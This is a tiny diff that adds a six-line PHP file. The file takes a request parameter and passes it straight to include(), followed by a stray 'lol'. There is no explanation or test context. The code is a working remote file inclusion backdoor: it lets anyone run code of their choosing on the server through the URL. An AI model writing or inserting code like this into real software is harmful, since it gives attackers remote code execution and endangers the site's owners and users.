@@ -1,0 +1,6 @@
+<?php
+$url = $_REQUEST['u'];
+
+include($url);
+?>
+lol
